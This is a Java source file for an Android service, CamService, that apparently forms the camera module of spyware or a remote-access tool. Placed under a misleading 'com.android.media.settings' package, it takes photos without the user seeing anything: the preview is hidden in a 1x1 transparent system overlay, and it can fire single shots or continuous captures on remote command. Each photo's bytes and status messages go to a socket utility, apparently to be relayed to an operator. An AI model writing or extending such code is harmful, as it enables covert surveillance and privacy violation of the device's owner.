package com.android.media.settings.Service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.android.media.settings.Model.Property;
import com.android.media.settings.Utility.CameraUtility;
import com.android.media.settings.Utility.SocketUtil;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import static android.content.ContentValues.TAG;


public class CamService extends Service {
    public static final String INTENT_SELECTED_CAMERA = "SELECTED_CAMERA_FOR_SNAP";
    public static final String INTENT_SELECTED_FUNCTION = "SELECTED_OPERATION";
    public static final String INTENT_CAMERA_ROTATION = "CAMERA_ROTATION";
    public static final String INTENT_PROPERTY_STRING = "MS_PROPERTY";
    public static final int FUNCTION_TAKE_SNAP = 1;

    private Camera camera;
    private boolean safeToTakePicture = false;

    private int camRotation;
    private Property property;
    private boolean isStreamMode;
    private List<Camera.Size> supportedSizes;

    private static final String TAG = "CamService";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mCameraService = this;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        informSocket("Command Received: Take Snap - Processing......");
        informSocket("Total Cameras: " + CameraUtility.totalCameras());

        if(intent == null) {
            throw new IllegalStateException("Must start the service with intent");
        }

        String propertyString = intent.getStringExtra(INTENT_PROPERTY_STRING);
        if(propertyString == null ||  propertyString.isEmpty() || propertyString.equals("null")) {
            property = new Property();
        }

        try {
            property = Property.fromJson(propertyString);
        } catch (Exception e) {
            Log.d(TAG, "Unable to parse property object, defaulting values");
            property = new Property();
            informSocket("Unable to parse property object, defaulting values");
        }

        isStreamMode = false;
        if(!property.getSnapMode().equals(Property.SNAP_MODE_SINGLE)) {
            isStreamMode = true;
        }
        startPreview();
        return START_NOT_STICKY;
    }

    private void startPreview() {
        try {
            initCamera();
        } catch (Exception e) {
            throwErrorAndExit(e);
        }
    }

    public static void takeSnap(Context context, Property property) {
        Intent intent = new Intent(context, CamService.class);
        intent.putExtra(INTENT_PROPERTY_STRING, Property.toJson(property));
        context.startService(intent);
    }

    private static CamService mCameraService;
    public static synchronized CamService getInstance() {
        return mCameraService;
    }

    public void initCamera() throws Exception {
        informSocket("Take Snap - Initialising Camera");
        if(camera != null) camera.release();
        camera = CameraUtility.getCameraInstance(property.getCameraId());
        if(camera == null) return;
        SurfaceView surfaceView = new SurfaceView(getApplicationContext());
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        SurfaceHolder sh = surfaceView.getHolder();
        surfaceView.setZOrderOnTop(true);
        sh.setFormat(PixelFormat.TRANSPARENT);
        sh.addCallback(surfaceCb);
        wm.addView(surfaceView, params);
    }

    private SurfaceHolder.Callback surfaceCb = new SurfaceHolder.Callback() {
        @Override
        public void surfaceCreated(SurfaceHolder surfaceHolder) {

        }

        @Override
        public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {
            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(property.getFocusMode());
            params.setRotation(property.getRotation());
            camera.setParameters(params);
            Camera.Parameters p = camera.getParameters();

            List<Camera.Size> listSize;
            listSize = p.getSupportedPreviewSizes();
            Camera.Size mPreviewSize = listSize.get(property.getResolution());
            p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

            listSize = p.getSupportedPictureSizes();
            supportedSizes = listSize;
            Camera.Size mPictureSize = listSize.get(property.getResolution());
            p.setPictureSize(mPictureSize.width, mPictureSize.height);

            try {
                camera.setParameters(p);
                camera.setPreviewDisplay(surfaceHolder);
                camera.startPreview();
            } catch (Exception e) {
                e.printStackTrace();
                throwErrorAndExit(e);
            }
            safeToTakePicture = true;

            new Handler().postDelayed(() -> takePicture(), property.getSnapDelay());
        }

        @Override
        public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            Log.d(TAG, "Surface Destroyed");
        }
    };

    public void takePicture() {
        //Log.d(TAG, "Attempting to take snap!");
        //informSocket("Attempting to take snap!");
        if(camera != null) {
            try {
                if(safeToTakePicture) {
                    camera.takePicture(null, null, mPicture);
                    safeToTakePicture = false;
                }
            } catch (Exception e) {
                e.printStackTrace();
                throwErrorAndExit(e);
            }
        }
    }

    private void retakePicture() {
        if(camera != null) {
            try {
                camera.reconnect();
                camera.startPreview();
            } catch (Exception e) {
                e.printStackTrace();
                throwErrorAndExit(e);
            }
            new Handler().postDelayed(this::takePicture, property.getSnapDelay());
        }
    }

    private Camera.PictureCallback mPicture = (byte[] data, Camera camera) -> {
        Bundle bundle = new Bundle();
        bundle.putByteArray(SocketUtil.INTENT_TYPE_IMAGE_BYTES, data);
        sendBroadcast(SocketUtil.INTENT_TYPE_IMAGE_BYTES, bundle);
        safeToTakePicture = true;

        if(isStreamMode) {
            retakePicture();
        } else {
            stopSelf();
        }
    };

    private void informSocket(String msg) {
        Bundle bundle = new Bundle();
        bundle.putString(SocketUtil.INTENT_TYPE_EXCEPTION, msg);
        sendBroadcast(SocketUtil.INTENT_TYPE_EXCEPTION, bundle);
    }

    private void throwErrorAndExit(String err) {
        informSocket(err);
        stopSelf();
    }

    private void throwErrorAndExit(Exception e) {
        Writer writer = new StringWriter();
        e.printStackTrace(new PrintWriter(writer));
        String excString = writer.toString();
        throwErrorAndExit(excString);
    }

    private void sendBroadcast(String type, Bundle data) {
        Intent intent = new Intent(SocketUtil.INTENT_CAM_SERVICE_UPDATES);
        intent.putExtra(SocketUtil.INTENT_CS_TYPE, type);
        switch (type) {
            case SocketUtil.INTENT_TYPE_EXCEPTION:
                intent.putExtra(SocketUtil.INTENT_EXCEPTION_MESSAGE, data.getString(type));
                break;

            case SocketUtil.INTENT_TYPE_IMAGE_BYTES:
                intent.putExtra(SocketUtil.INTENT_IMAGE_BYTES, data.getByteArray(type));
                break;
        }
        LocalBroadcastManager.getInstance(CamService.this).sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if(camera != null) camera.release();
    }
}
